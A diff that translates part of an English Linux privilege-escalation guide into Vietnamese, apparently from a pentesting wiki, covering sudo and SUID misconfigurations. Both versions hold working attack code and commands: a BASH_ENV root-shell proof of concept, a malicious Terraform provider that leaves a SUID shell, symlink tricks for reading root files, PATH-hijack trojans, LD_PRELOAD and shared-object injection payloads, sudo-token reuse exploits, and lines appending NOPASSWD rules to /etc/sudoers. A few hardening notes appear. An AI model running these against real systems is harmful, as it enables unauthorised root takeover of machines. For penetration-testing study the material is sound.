-- Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.<sup>[[23]](#references)</sup>
+- Vì sao hoạt động: Với shell không tương tác, Bash đánh giá `$BASH_ENV` và nạp tệp đó trước khi chạy script đích. Nhiều quy tắc sudo cho phép chạy một script hoặc shell wrapper. Nếu `BASH_ENV` được sudo giữ lại, tệp của bạn sẽ được nạp với quyền root.<sup>[[23]](#references)</sup>
 
-- Requirements:
-  - A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
-  - `BASH_ENV` present in `env_keep` (check with `sudo -l`).
+- Yêu cầu:
+  - Một quy tắc sudo mà bạn có thể chạy (bất kỳ mục tiêu nào gọi `/bin/bash` ở chế độ không tương tác hoặc bất kỳ bash script nào).
+  - `BASH_ENV` có trong `env_keep` (kiểm tra bằng `sudo -l`).
 
 - PoC:
 
@@ -1368,16 +1368,16 @@ BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/
 # You should now have a root shell
 ```
 
-- Hardening:
-  - Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
-  - Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
-  - Consider sudo I/O logging and alerting when preserved env vars are used.
+- Tăng cường bảo mật:
+  - Xóa `BASH_ENV` (và `ENV`) khỏi `env_keep`, ưu tiên `env_reset`.
+  - Tránh dùng shell wrapper cho các lệnh được phép chạy bằng sudo; dùng binary tối giản.
+  - Cân nhắc ghi nhật ký I/O của sudo và cảnh báo khi các biến môi trường được giữ lại được sử dụng.
 
-### Terraform via sudo with preserved HOME (!env_reset)
+### Terraform qua sudo với `HOME` được giữ lại (!env_reset)
 
-When sudo allows Terraform as a more privileged user, `!env_reset` is a clue to check which environment variables actually survive that specific rule. Confirm the effective `HOME` or `TF_CLI_CONFIG_FILE` before treating a caller-writable `.terraformrc` or `terraform.rc` as the active CLI configuration. A `provider_installation.dev_overrides` entry matters only if the fixed Terraform command loads that provider and the caller can place its executable in the selected directory.<sup>[[25]](#references)</sup>
+Khi sudo cho phép chạy Terraform với tư cách người dùng có nhiều đặc quyền hơn, `!env_reset` là dấu hiệu để kiểm tra những biến môi trường nào thực sự được giữ lại theo quy tắc cụ thể đó. Hãy xác nhận `HOME` hoặc `TF_CLI_CONFIG_FILE` hiệu lực trước khi xem `.terraformrc` hoặc `terraform.rc` mà người gọi có quyền ghi là cấu hình CLI đang được sử dụng. Một mục `provider_installation.dev_overrides` chỉ có tác dụng nếu lệnh Terraform cố định tải provider đó và người gọi có thể đặt tệp thực thi của nó trong thư mục đã chọn.<sup>[[25]](#references)</sup>
 
-- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
+- Trỏ provider cần thiết đến một thư mục có quyền ghi và đặt một plugin độc hại mang tên provider đó (ví dụ: `terraform-provider-examples`):
 
 ```hcl
 # ~/.terraformrc
@@ -1400,11 +1400,11 @@ chmod +x /dev/shm/terraform-provider-examples
 sudo /usr/bin/terraform -chdir=/opt/examples apply
 ```
 
-Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.
+Terraform sẽ thất bại ở bước bắt tay Go plugin nhưng thực thi payload với quyền root trước khi thoát, để lại một shell SUID.
 
-### TF_VAR overrides + symlink validation bypass
+### Ghi đè TF_VAR + bypass xác thực symlink
 
-Terraform variables can be provided via `TF_VAR_<name>` environment variables if the specific sudo rule preserves them. A source-symlink **read** also needs a provider that follows the link and copies the protected result to a caller-readable destination. A destination-symlink **write** separately needs a caller-controlled destination entry and a privileged provider that follows it on write; a later scheduled job is only one possible consequence. Inspect the exact sudo grant, relevant `.tf` files, selected CLI config, and path ownership with read-only commands such as `sudo -l`, `stat`, and `readlink` before testing either route. Weak lexical validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` do not resolve symlinks:<sup>[[25]](#references)</sup>
+Có thể cung cấp biến Terraform thông qua các biến môi trường `TF_VAR_<name>` nếu quy tắc sudo cụ thể giữ lại chúng. Để **đọc** qua symlink nguồn, provider cũng cần đi theo liên kết và sao chép kết quả được bảo vệ đến một đích mà người gọi có thể đọc. Riêng việc **ghi** qua symlink đích cần một mục đích đến do người gọi kiểm soát và một provider đặc quyền đi theo liên kết khi ghi; một job được lên lịch sau đó chỉ là một trong những hậu quả có thể xảy ra. Trước khi thử một trong hai cách, hãy kiểm tra chính xác quyền sudo được cấp, các tệp `.tf` liên quan, cấu hình CLI được chọn và quyền sở hữu đường dẫn bằng các lệnh chỉ đọc như `sudo -l`, `stat` và `readlink`. Các bước xác thực yếu dựa trên chuỗi như `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` không phân giải symlink:<sup>[[25]](#references)</sup>
 
 ```bash
 mkdir -p /dev/shm/root/examples
@@ -1413,23 +1413,23 @@ TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/o
 cat /home/$USER/docker/previous/public/examples/flag
 ```
 
-Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **write** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).
+Terraform phân giải symlink và sao chép `/root/root.txt` thật vào một vị trí đích mà attacker có thể đọc. Có thể dùng cách tương tự để **ghi** vào các đường dẫn đặc quyền bằng cách tạo trước symlink tại vị trí đích (ví dụ: trỏ đường dẫn đích của provider vào bên trong `/etc/cron.d/`).
 
 ### requiretty / !requiretty
 
-On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
+Trên một số bản phân phối cũ, sudo có thể được cấu hình với `requiretty`, buộc sudo chỉ chạy từ một TTY tương tác. Nếu đặt `!requiretty` (hoặc không có tùy chọn này), sudo có thể được thực thi từ các ngữ cảnh không tương tác như reverse shell, cron job hoặc script.
 
 ```bash
 Defaults !requiretty
 ```
 
-This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.
+Đây không phải là một lỗ hổng trực tiếp, nhưng nó mở rộng các tình huống có thể lạm dụng quy tắc sudo mà không cần PTY đầy đủ.
 
-### Sudo env_keep+=PATH / insecure secure_path → PATH hijack
+### Sudo env_keep+=PATH / secure_path không an toàn → PATH hijack
 
-If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), an unqualified external command inside the sudo-allowed target may be shadowed.<sup>[[3]](#references)</sup> An absent effective `secure_path` also merits review **if** the command's sudo environment preserves a caller-controlled `PATH`; absence alone does not prove that it does. Read the permitted script without running it, then verify the exact RunAs and argument rule, the effective command search path, and an earlier writable and traversable directory containing the command name. Authentication, `NOEXEC`, shell builtins, and absolute command paths can change the outcome.
+Nếu `sudo -l` hiển thị `env_keep+=PATH` hoặc `secure_path` chứa các mục mà attacker có thể ghi (ví dụ: `/home/<user>/bin`), một lệnh bên ngoài không được chỉ định đường dẫn đầy đủ bên trong mục tiêu được sudo cho phép có thể bị ghi đè.<sup>[[3]](#references)</sup> Cũng cần xem xét trường hợp không có `secure_path` hiệu lực **nếu** môi trường sudo của lệnh giữ lại `PATH` do người gọi kiểm soát; chỉ riêng việc thiếu `secure_path` không chứng minh điều đó. Đọc script được cho phép mà không chạy nó, sau đó xác minh chính xác quy tắc RunAs và đối số, đường dẫn tìm kiếm lệnh hiệu lực, cùng một thư mục có thể ghi và truy cập được nằm ở vị trí ưu tiên hơn, chứa tên lệnh đó. Việc xác thực, `NOEXEC`, shell builtin và đường dẫn lệnh tuyệt đối có thể làm thay đổi kết quả.
 
-- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
+- Yêu cầu: một quy tắc sudo (thường là `NOPASSWD`) chạy script/binary gọi các lệnh không dùng đường dẫn tuyệt đối (`free`, `df`, `ps`, v.v.) và có mục PATH có thể ghi được, được tìm kiếm trước.
 
 ```bash
 cat > ~/bin/free <<'EOF'
@@ -1441,8 +1441,8 @@ sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
 bash -p                                # root shell via SUID bit
 ```
 
-### Sudo execution bypassing paths
-**Jump** to read other files or use **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
+### Bỏ qua đường dẫn khi thực thi bằng Sudo
+**Di chuyển** để đọc các tệp khác hoặc sử dụng **symlinks**. Ví dụ trong tệp sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
 
 ```bash
 sudo less /var/logs/anything
@@ -1454,18 +1454,18 @@ ln /etc/shadow /var/log/new
 sudo less /var/log/new #Use symlinks to read any file
 ```
 
-If a **wildcard** is used (\*), it is even easier:
+Nếu dùng **wildcard** (\*), thì còn dễ hơn:
 
 ```bash
 sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
 
-**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
+**Biện pháp đối phó**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
-### Sudo command/SUID binary without command path
+### Lệnh Sudo/tệp nhị phân SUID không có đường dẫn lệnh
 
-If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ you can exploit it by changing the PATH variable
+Nếu **quyền sudo** được cấp cho một lệnh duy nhất **mà không chỉ định đường dẫn**: _hacker10 ALL= (root) less_, bạn có thể khai thác bằng cách thay đổi biến PATH
 
 ```bash
 export PATH=/tmp:$PATH
@@ -1473,32 +1473,32 @@ export PATH=/tmp:$PATH
 sudo less
 ```
 
-This technique can also be used if a **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**.
+Kỹ thuật này cũng có thể được sử dụng nếu một binary **suid** **thực thi lệnh khác mà không chỉ định đường dẫn đến lệnh đó (luôn kiểm tra nội dung của một binary SUID lạ bằng** _**strings**_**)**.
 
-[Payload examples to execute.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)
+[Ví dụ payload để thực thi.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)
 
-### SUID binary with command path
+### Binary SUID có đường dẫn lệnh
 
-If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.
+Nếu binary **suid** **thực thi lệnh khác bằng cách chỉ định đường dẫn**, bạn có thể thử **export một function** có tên trùng với lệnh mà file suid gọi.
 
-For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
+Ví dụ: nếu một binary suid gọi _**/usr/sbin/service apache2 start**_, bạn cần thử tạo và export function đó:
 
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
 
-Then, when you call the suid binary, this function will be executed
+Sau đó, khi bạn gọi binary SUID, hàm này sẽ được thực thi
 
-### Custom SUID copy wrappers
+### Wrapper copy SUID tùy chỉnh
 
-A root-owned SUID utility that accepts source and destination paths can cross two different trust boundaries. If it builds a shell command from either argument (for example, passing a constructed `cp` command to `system()`), shell metacharacters may execute another command with its effective privileges. Even if it invokes `cp` safely without a shell, an unrestricted destination can permit an arbitrary privileged write to files such as `/etc/passwd`. Review the wrapper's argument handling, effective UID behavior, destination restrictions, and whether the copied file keeps caller-controlled contents; a generic `cp` error or SUID bit alone is not proof of either path. Enumerate the binary and permissions passively before any manual testing.
+Một tiện ích SUID thuộc sở hữu của root, chấp nhận đường dẫn nguồn và đích, có thể vượt qua hai ranh giới tin cậy khác nhau. Nếu nó tạo lệnh shell từ một trong hai tham số (ví dụ: truyền lệnh `cp` được tạo sẵn cho `system()`), các ký tự đặc biệt của shell có thể thực thi lệnh khác với các quyền hiệu lực của binary. Ngay cả khi gọi `cp` an toàn, không thông qua shell, việc không giới hạn đường dẫn đích có thể cho phép ghi tùy ý vào các file đặc quyền như `/etc/passwd`. Hãy kiểm tra cách wrapper xử lý tham số, hành vi của effective UID, các giới hạn đối với đường dẫn đích và liệu file được sao chép có giữ nội dung do người gọi kiểm soát hay không; chỉ riêng lỗi chung của `cp` hoặc bit SUID không chứng minh được khả năng khai thác theo cách nào. Trước khi kiểm thử thủ công, hãy liệt kê binary và quyền của nó theo cách thụ động.
 
-### Writable script executed by a SUID wrapper
+### Script có thể ghi được được thực thi bởi wrapper SUID
 
-A common custom-app misconfiguration is a root-owned SUID binary wrapper that executes a script, while the script itself is writable by low-priv users.
+Một cấu hình sai thường gặp trong ứng dụng tùy chỉnh là wrapper binary SUID thuộc sở hữu của root thực thi một script, trong khi người dùng có quyền thấp có thể ghi vào chính script đó.
 
-Typical pattern:
+Mẫu thường gặp:
 
 ```c
 int main(void) {
@@ -1506,7 +1506,7 @@ int main(void) {
 }
 ```
 
-If `/usr/local/bin/backup.sh` is writable, you can append payload commands and then execute the SUID wrapper:
+Nếu `/usr/local/bin/backup.sh` có thể ghi, bạn có thể thêm các lệnh payload vào cuối rồi thực thi wrapper SUID:
 
 ```bash
 echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
@@ -1514,7 +1514,7 @@ echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/loca
 /var/tmp/rootbash -p
 ```
 
-Quick checks:
+Kiểm tra nhanh:
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -1522,24 +1522,24 @@ strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
 ls -l /usr/local/bin/backup.sh
 ```
 
-This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.
+Đường tấn công này đặc biệt phổ biến trong các wrapper “maintenance”/“backup” được cài trong `/usr/local/bin`.
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
-The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
+Biến môi trường **LD_PRELOAD** được dùng để chỉ định một hoặc nhiều thư viện dùng chung (tệp .so) mà loader sẽ tải trước tất cả các thư viện khác, bao gồm cả thư viện C chuẩn (`libc.so`). Quá trình này được gọi là preloading một thư viện.
 
-However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:
+Tuy nhiên, để duy trì tính bảo mật của hệ thống và ngăn tính năng này bị khai thác, đặc biệt là với các tệp thực thi **suid/sgid**, hệ thống áp dụng một số điều kiện:
 
-- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
-- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.
+- Loader bỏ qua **LD_PRELOAD** đối với các tệp thực thi có ID người dùng thực (_ruid_) không khớp với ID người dùng hiệu lực (_euid_).
+- Đối với các tệp thực thi có suid/sgid, chỉ những thư viện nằm trong các đường dẫn chuẩn và cũng có suid/sgid mới được preload.
 
-Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.<sup>[[9]](#references)</sup>
+Có thể leo thang đặc quyền nếu bạn có khả năng chạy lệnh bằng `sudo` và đầu ra của `sudo -l` có chứa chỉ thị **env_keep+=LD_PRELOAD**. Cấu hình này cho phép biến môi trường **LD_PRELOAD** được giữ lại và nhận diện ngay cả khi chạy lệnh bằng `sudo`, từ đó có khả năng dẫn đến việc thực thi mã tùy ý với đặc quyền cao hơn.<sup>[[9]](#references)</sup>
 
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
 
-Save as **/tmp/pe.c**
+Lưu dưới tên **/tmp/pe.c**
 
 ```c
 #include <stdio.h>
@@ -1554,21 +1554,21 @@ void _init() {
 }
 ```
 
-Then **compile it** using:
+Sau đó **biên dịch nó** bằng cách:
 
 ```bash
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
 
-Finally, **escalate privileges** running
+Cuối cùng, **leo thang đặc quyền** bằng cách chạy
 
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
 > [!CAUTION]
-> A similar privesc can be abused if the attacker controls the **LD_LIBRARY_PATH** env variable because he controls the path where libraries are going to be searched.
+> Có thể lợi dụng một kiểu privesc tương tự nếu attacker kiểm soát biến môi trường **LD_LIBRARY_PATH**, vì họ kiểm soát đường dẫn dùng để tìm kiếm các thư viện.
 
 ```c
 #include <stdio.h>
@@ -1592,15 +1592,15 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 
 ### SUID Binary – .so injection
 
-When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files properly. This can be checked by running the following command:<sup>[[17]](#references)</sup>
+Khi gặp một binary có quyền **SUID** trông bất thường, bạn nên kiểm tra xem nó có tải các file **.so** đúng cách hay không. Có thể kiểm tra bằng cách chạy lệnh sau:<sup>[[17]](#references)</sup>
 
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
 
-For instance, encountering an error like _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggests a potential for exploitation.
+Chẳng hạn, nếu gặp lỗi như _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, điều đó cho thấy có khả năng khai thác.
 
-To exploit this, one would proceed by creating a C file, say _"/path/to/.config/libcalc.c"_, containing the following code:
+Để khai thác điều này, hãy tạo một tệp C, chẳng hạn _"/path/to/.config/libcalc.c"_, chứa đoạn mã sau:
 
 ```c
 #include <stdio.h>
@@ -1613,15 +1613,15 @@ void inject(){
 }
 ```
 
-This code, once compiled and executed, aims to elevate privileges by manipulating file permissions and executing a shell with elevated privileges.
+Đoạn code này, sau khi được biên dịch và thực thi, nhằm nâng cao quyền bằng cách thao tác với quyền truy cập tệp và thực thi shell với quyền cao hơn.
 
-Compile the above C file into a shared object (.so) file with:
+Biên dịch tệp C ở trên thành tệp shared object (.so) bằng lệnh:
 
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
 
-Finally, running the affected SUID binary should trigger the exploit, allowing for potential system compromise.
+Cuối cùng, chạy binary SUID bị ảnh hưởng sẽ kích hoạt exploit, có khả năng dẫn đến xâm phạm hệ thống.
 
 ## Shared Object Hijacking
 
@@ -1635,7 +1635,7 @@ readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
 
-Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:
+Giờ chúng ta đã tìm thấy một binary SUID tải library từ thư mục mà chúng ta có quyền ghi, hãy tạo library trong thư mục đó với tên cần thiết:
 
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
@@ -1650,19 +1650,19 @@ void hijack() {
 }
 ```
 
-If you get an error such as
+Nếu bạn gặp lỗi như
 
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
 
-that means that the library you have generated need to have a function called `a_function_name`.
+điều đó có nghĩa là thư viện bạn đã tạo cần có một hàm tên là `a_function_name`.
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.
+[**GTFOBins**](https://gtfobins.github.io) là danh sách được tuyển chọn gồm các binary Unix mà kẻ tấn công có thể khai thác để vượt qua các hạn chế bảo mật cục bộ. [**GTFOArgs**](https://gtfoargs.github.io/) cũng tương tự, nhưng dành cho các trường hợp bạn **chỉ có thể chèn đối số** vào một lệnh.
 
-The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+Dự án tập hợp các chức năng hợp pháp của binary Unix có thể bị lạm dụng để thoát khỏi restricted shell, leo thang hoặc duy trì đặc quyền nâng cao, truyền tệp, tạo bind shell và reverse shell, cũng như hỗ trợ các tác vụ post-exploitation khác.
 
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
@@ -1681,24 +1681,24 @@ https://gtfoargs.github.io/
 
 ### FallOfSudo
 
-If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.
+Nếu có thể truy cập `sudo -l`, bạn có thể dùng công cụ [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) để kiểm tra xem công cụ có tìm ra cách khai thác quy tắc sudo nào không.
 
-### Reusing Sudo Tokens
+### Tái sử dụng Sudo Tokens
 
-In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.<sup>[[18]](#references)</sup>
+Trong trường hợp bạn có **quyền truy cập sudo** nhưng không có mật khẩu, bạn có thể leo thang đặc quyền bằng cách **chờ một lệnh sudo được thực thi rồi chiếm quyền phiên token**.<sup>[[18]](#references)</sup>
 
-Requirements to escalate privileges:
+Các yêu cầu để leo thang đặc quyền:
 
-- You already have a shell as user "_sampleuser_"
-- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
-- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
-- `gdb` is accessible (you can be able to upload it)
+- Bạn đã có shell với tư cách người dùng "_sampleuser_"
+- "_sampleuser_" đã **dùng `sudo`** để thực thi một lệnh nào đó trong **15 phút vừa qua** (mặc định, đó là thời hạn của sudo token, cho phép chúng ta dùng `sudo` mà không cần nhập mật khẩu)
+- `cat /proc/sys/kernel/yama/ptrace_scope` trả về 0
+- Có thể truy cập `gdb` (bạn có thể tải nó lên)
 
-(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)
+(Bạn có thể tạm thời bật `ptrace_scope` bằng lệnh `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` hoặc bật vĩnh viễn bằng cách chỉnh sửa `/etc/sysctl.d/10-ptrace.conf` và đặt `kernel.yama.ptrace_scope = 0`)
 
-If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
+Nếu đáp ứng tất cả các yêu cầu này, **bạn có thể leo thang đặc quyền bằng cách dùng:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
-- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
+- **Exploit đầu tiên** (`exploit.sh`) sẽ tạo binary `activate_sudo_token` trong _/tmp_. Bạn có thể dùng nó để **kích hoạt sudo token trong phiên của mình** (bạn sẽ không tự động có được root shell; hãy chạy `sudo su`):
 
 ```bash
 bash exploit.sh
@@ -1706,14 +1706,14 @@ bash exploit.sh
 sudo su
 ```
 
-- The **second exploit** (`exploit_v2.sh`) will create a sh shell in _/tmp_ **owned by root with setuid**
+- **Exploit thứ hai** (`exploit_v2.sh`) sẽ tạo một shell sh trong _/tmp_ **do root sở hữu với setuid**
 
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
 ```
 
-- The **third exploit** (`exploit_v3.sh`) will **create a sudoers file** that makes **sudo tokens eternal and allows all users to use sudo**
+- **Exploit thứ ba** (`exploit_v3.sh`) sẽ **tạo một tệp sudoers** khiến **sudo tokens tồn tại vĩnh viễn và cho phép tất cả người dùng sử dụng sudo**
 
 ```bash
 bash exploit_v3.sh
@@ -1722,8 +1722,8 @@ sudo su
 
 ### /var/run/sudo/ts/\<Username>
 
-If you have **write permissions** in the folder or on any of the created files inside the folder you can use the binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) to **create a sudo token for a user and PID**.\
-For example, if you can overwrite the file _/var/run/sudo/ts/sampleuser_ and you have a shell as that user with PID 1234, you can **obtain sudo privileges** without needing to know the password doing:
+Nếu bạn có **quyền ghi** trong thư mục hoặc vào bất kỳ tệp nào được tạo bên trong thư mục, bạn có thể dùng binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) để **tạo sudo token cho một người dùng và PID**.\
+Ví dụ: nếu bạn có thể ghi đè tệp _/var/run/sudo/ts/sampleuser_ và có shell với tư cách người dùng đó, với PID 1234, bạn có thể **lấy quyền sudo** mà không cần biết mật khẩu bằng cách thực hiện:
 
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
@@ -1731,22 +1731,22 @@ For example, if you can overwrite the file _/var/run/sudo/ts/sampleuser_ and you
 
 ### /etc/sudoers, /etc/sudoers.d
 
-The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
-**If** you can **read** this file you could be able to **obtain some interesting information**, and if you can **write** any file you will be able to **escalate privileges**.
+Tệp `/etc/sudoers` và các tệp bên trong `/etc/sudoers.d` cấu hình ai có thể dùng `sudo` và cách sử dụng. Theo mặc định, **chỉ người dùng root và nhóm root mới có thể đọc các tệp này**.\
+**Nếu** bạn có thể **đọc** tệp này, bạn có thể **thu thập một số thông tin hữu ích**; nếu bạn có thể **ghi** vào bất kỳ tệp nào, bạn sẽ có thể **leo thang đặc quyền**.
 
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
 
-If you can write you can abuse this permission
+Nếu bạn có quyền ghi, bạn có thể lạm dụng quyền này.
 
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
 
-Another way to abuse these permissions:
+Một cách khác để lạm dụng các quyền này:
 
 ```bash
 # makes it so every terminal can sudo
@@ -1757,7 +1757,7 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 
 ### DOAS
 
-There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
+Có một số lựa chọn thay thế cho binary `sudo`, chẳng hạn như `doas` trên OpenBSD. Hãy nhớ kiểm tra cấu hình tại `/etc/doas.conf`
 
 ```bash
 permit nopass demo as root cmd vim
@@ -1765,22 +1765,22 @@ permit nopass demo as root cmd python3
 permit nopass keepenv demo as root cmd /opt/backup.sh
 ```
 
-If `doas` allows an editor or interpreter, check GTFOBins-style escapes:
+Nếu `doas` cho phép dùng trình soạn thảo hoặc trình thông dịch, hãy kiểm tra các kỹ thuật escape kiểu GTFOBins:
 
 ```bash
 doas vim
 :!/bin/sh
 ```
 
-A root-capable `doas` rule for the original Python-based `dstat` also merits a plugin-path review. Its [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) and [source](https://github.com/dstat-real/dstat/blob/master/dstat) list `/usr/share/dstat/` and `/usr/local/share/dstat/` among locations for `dstat_*.py` plugins. If the current user can write and search a location actually used by the installed build, a selected plugin may run with the `doas` RunAs identity. Confirm the effective rule, plugin lookup in that build, directory and parent permissions or ACLs, and whether the caller can select a plugin; a `dstat` rule or writable directory alone is only a lead. Other `dstat` implementations can use different plugin systems. Inspect metadata passively without loading a plugin.
+Một quy tắc `doas` có quyền root cho `dstat` gốc viết bằng Python cũng cần được xem xét về đường dẫn plugin. [Tài liệu hướng dẫn](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) và [mã nguồn](https://github.com/dstat-real/dstat/blob/master/dstat) liệt kê `/usr/share/dstat/` và `/usr/local/share/dstat/` trong số các vị trí chứa plugin `dstat_*.py`. Nếu người dùng hiện tại có thể ghi vào và tìm kiếm trong một vị trí thực sự được bản build đã cài sử dụng, plugin được chọn có thể chạy với danh tính RunAs của `doas`. Hãy xác nhận quy tắc có hiệu lực, cách tra cứu plugin trong bản build đó, quyền hoặc ACL của thư mục và thư mục cha, cũng như liệu người gọi có thể chọn plugin hay không; chỉ riêng quy tắc `dstat` hoặc thư mục có thể ghi mới chỉ là manh mối. Các bản triển khai `dstat` khác có thể dùng hệ thống plugin khác. Kiểm tra metadata theo cách thụ động, không tải plugin.
 
 ### Sudo Hijacking
 
-If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.
+Nếu bạn biết **một người dùng thường kết nối đến máy và dùng `sudo`** để leo thang đặc quyền, đồng thời bạn có shell trong ngữ cảnh người dùng đó, bạn có thể **tạo một tệp thực thi sudo mới** để chạy mã của bạn với quyền root rồi chạy lệnh của người dùng. Sau đó, **sửa đổi $PATH** trong ngữ cảnh người dùng đó (ví dụ: thêm đường dẫn mới vào .bash_profile) để khi người dùng chạy sudo, tệp thực thi sudo của bạn sẽ được chạy.
 
